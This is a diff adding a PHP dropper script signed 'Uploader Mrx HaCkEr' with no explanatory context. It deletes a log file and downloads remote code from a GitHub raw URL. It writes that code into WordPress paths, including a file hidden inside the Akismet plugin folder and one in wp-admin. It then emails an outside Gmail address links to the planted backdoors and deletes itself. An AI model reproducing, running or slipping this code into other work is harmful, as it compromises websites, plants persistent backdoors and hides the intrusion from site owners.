@@ -1,0 +1,45 @@
+rm ~/.logs
+echo "Uploader Mrx HaCkEr";function http_get($url){
+	$im = curl_init($url);
+	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
+	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($im, CURLOPT_HEADER, 0);
+	return curl_exec($im);
+	curl_close($im);
+}
+$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/plugins/akismet/IPvx.php" ;
+$text = http_get('https://raw.githubusercontent.com/root901/xx/main/3.txt');
+$open = fopen($check, 'w');
+fwrite($open, $text);
+fclose($open);
+if(file_exists($check)){
+    echo $check."</br>";
+}else 
+  echo "not exits";
+echo "done .\n " ;
+$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/mi.php" ;
+$text2 = http_get('https://raw.githubusercontent.com/root901/xx/main/4.txt');
+$open2 = fopen($check2, 'w');
+fwrite($open2, $text2);
+fclose($open2);
+if(file_exists($check2)){
+    echo $check2."</br>";
+}else
+  echo "not exits2";
+?>
+<?php
+$sender = "jiancox@".$_SERVER['SERVER_NAME']."";
+$recipient = 'mrxxx9901@gmail.com';
+$subject = "".$_SERVER['HTTP_HOST']." bisa send mail xd";
+$message = "Api 1 : <a href=\"http://".$_SERVER['HTTP_HOST']."/mrx.php\">".$_SERVER['HTTP_HOST']."/wp-admin//api.php</a>\n<br>Api 2: <a href=\"http://".$_SERVER['HTTP_HOST']."/vendor/laravel/framework/api.php\">".$_SERVER['HTTP_HOST']."/vendor/laravel/framework/api.php</a>\n<br>";
+$headers = 'From:' . $sender;
+
+if (mail($recipient, $subject, $message, $headers))
+{
+    echo "Pesan berhasil dikirim slur";
+}
+
+
+
+@unlink(__FILE__);
